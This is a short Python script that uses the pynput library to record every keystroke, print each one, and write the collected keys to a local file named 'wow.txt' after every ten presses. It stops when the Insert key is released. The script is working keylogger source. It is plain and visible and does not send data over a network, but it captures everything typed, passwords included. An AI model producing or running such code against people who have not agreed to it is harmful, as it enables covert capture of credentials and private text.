import pynput 
from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
	global keys, count
	keys.append(key)
	count += 1

	print(" {0} ".format(key))

	if count > 10:
		count = 0 
		write_file(keys)

def write_file(keys):
	with open('wow.txt','w') as f:
		for key in keys:
			f.write(str(key))


def on_release(key):
	if key == Key.insert:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()


